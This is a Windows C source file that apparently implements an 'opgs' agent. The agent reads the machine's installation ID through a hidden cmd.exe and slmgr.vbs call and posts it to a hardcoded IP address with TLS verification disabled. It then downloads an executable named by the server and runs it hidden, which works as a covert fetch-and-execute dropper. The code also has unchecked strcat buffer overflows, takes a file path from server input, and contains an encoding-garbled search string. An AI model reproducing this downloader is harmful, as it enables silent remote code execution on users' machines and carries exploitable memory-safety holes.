#if defined(UNICODE) && !defined(_UNICODE)
    #define _UNICODE
#elif defined(_UNICODE) && !defined(UNICODE)
    #define UNICODE
#endif

#include <tchar.h>
#include <windows.h>
#define CURL_STATICLIB
#include <direct.h>
#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
#include <curl/curl.h>
#include <sys/stat.h>
#define POST_SIZE 2048

int mkdir(const char *);
char filename[FILENAME_MAX] = "C:\\tmp\\";
size_t callback_file(void *, size_t , size_t , FILE *);
void callback_data(void *, size_t , size_t , void *);
char command[256]="https://120.125.80.141/opgs/agent/mission/";


int WINAPI WinMain (HINSTANCE hThisInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR lpszArgument,
                     int nCmdShow)
{
    FILE *fp;
    CURL *curl;
    char *url = "https://120.125.80.141/opgs/agent/mission.php";
    char agent[] = "opgs/1.1";
    char postdata[POST_SIZE];
    char cmd[256];
    char line[1024];
    char *callback;
    _mkdir("C:\\tmp");


///get install ID
    char install_id[128];
    sprintf(cmd,"/c %s %s > C:\\tmp\\a.txt",
            "%windir%\\Sysnative\\cscript %windir%\\System32\\slmgr.vbs /dlv",
            "| %windir%\\Sysnative\\findstr \"¦w¸ËÃÑ§O½X\"");

    SHELLEXECUTEINFO ShExecInfo = {0};
    ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
    ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
    ShExecInfo.hwnd = NULL;
    ShExecInfo.lpVerb = NULL;
    ShExecInfo.lpFile = "cmd.exe";
    ShExecInfo.lpParameters = cmd;
    ShExecInfo.lpDirectory = NULL;
    ShExecInfo.nShow = SW_HIDE;
    ShExecInfo.hInstApp = NULL;
    ShellExecuteEx(&ShExecInfo);
    WaitForSingleObject(ShExecInfo.hProcess,INFINITE);


    fp = fopen("C:\\tmp\\a.txt", "r");
    fgets(line,1024,fp);
    sscanf(line,"%*s %s",install_id);


    sprintf(postdata,"install_id=%s",install_id);

///check mission
    curl = curl_easy_init();
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, agent);
    curl_easy_setopt(curl, CURLOPT_HEADER, 0L);
    curl_easy_setopt(curl, CURLOPT_POST,1L);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS,postdata);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, callback_data);
    curl_easy_perform(curl);

///download mission.exe
    fp = fopen(filename,"wb");
    curl_easy_setopt(curl, CURLOPT_URL, command);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, callback_file);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
    curl_easy_perform(curl);
    fclose(fp);
    curl_easy_cleanup(curl);

    ShellExecute(NULL,NULL,filename,NULL,NULL,SW_HIDE);
}

void callback_data(void *ptr, size_t size, size_t nmemb, void *stream)
{

    if ( strcmp((char *)ptr,"0") == 0 ) {
        exit(1);
    }
    else if(strlen((char *)ptr)>20){
        exit(1);
    }

    strcat(command,(char *)ptr);
    strcat(filename,(char *)ptr);

}

size_t callback_file(void *ptr, size_t size, size_t nmemb, FILE *stream)
{
    size_t written = fwrite(ptr, size, nmemb, stream);
    return written;
}
